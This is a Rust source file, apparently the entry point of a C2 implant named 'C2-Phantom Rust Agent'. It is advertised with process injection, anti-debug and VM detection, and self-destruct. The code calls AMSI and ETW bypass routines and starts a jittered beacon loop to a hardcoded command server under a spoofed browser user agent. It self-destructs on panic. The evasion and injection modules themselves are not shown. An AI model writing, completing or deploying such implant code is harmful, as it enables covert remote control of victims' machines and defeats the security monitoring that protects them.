/**
 * C2-Phantom Rust Agent
 * Zero-dependency, high-performance implant
 * 
 * Features:
 * - Async beacon with jitter
 * - ChaCha20-Poly1305 encryption
 * - Process injection
 * - Anti-debug/VM detection
 * - Self-destruct
 */

#![no_std]
#![no_main]

extern crate alloc;

use alloc::string::String;
use alloc::vec::Vec;
use core::panic::PanicInfo;

mod beacon;
mod crypto;
mod commands;
mod evasion;

use beacon::BeaconConfig;

/// Global allocator
#[global_allocator]
static ALLOCATOR: talc::Talc = talc::Talc::new(unsafe {
    talc::ClaimOnOom::new(talc::Span::empty())
});

/// Entry point
#[no_mangle]
pub extern "C" fn mainCRTStartup() -> ! {
    // Initialize heap
    unsafe {
        let heap_start = windows::Win32::System::Memory::VirtualAlloc(
            core::ptr::null(),
            1024 * 1024, // 1MB heap
            windows::Win32::System::Memory::MEM_COMMIT | windows::Win32::System::Memory::MEM_RESERVE,
            windows::Win32::System::Memory::PAGE_READWRITE,
        );
        
        if !heap_start.is_null() {
            ALLOCATOR.claim(talc::Span::new(heap_start as *mut u8, 1024 * 1024));
        }
    }
    
    // Run agent
    match run_agent() {
        Ok(_) => exit(0),
        Err(_) => exit(1),
    }
}

/// Main agent logic
fn run_agent() -> Result<(), ()> {
    // Anti-debug checks
    if evasion::is_debugger_present() {
        return Err(());
    }
    
    if evasion::is_vm() {
        // Optional: still run in VM or exit
    }
    
    // AMSI/ETW bypass (Windows only)
    #[cfg(windows)]
    {
        evasion::bypass_amsi();
        evasion::bypass_etw();
    }
    
    // Beacon configuration
    let config = BeaconConfig {
        server: "https://192.168.1.100:443",
        interval_ms: 60000,  // 60 seconds
        jitter_percent: 20,  // ±20%
        user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    };
    
    // Start beacon loop
    beacon::start(config)?;
    
    Ok(())
}

/// Exit process
fn exit(code: i32) -> ! {
    #[cfg(windows)]
    unsafe {
        windows::Win32::System::Threading::ExitProcess(code as u32);
    }
    
    #[cfg(not(windows))]
    unsafe {
        libc::exit(code);
    }
}

/// Panic handler
#[panic_handler]
fn panic(_info: &PanicInfo) -> ! {
    // Self-destruct on panic
    evasion::self_destruct();
    exit(1)
}

// Required for no_std
#[cfg(not(test))]
#[allow(non_camel_case_types)]
type c_void = core::ffi::c_void;
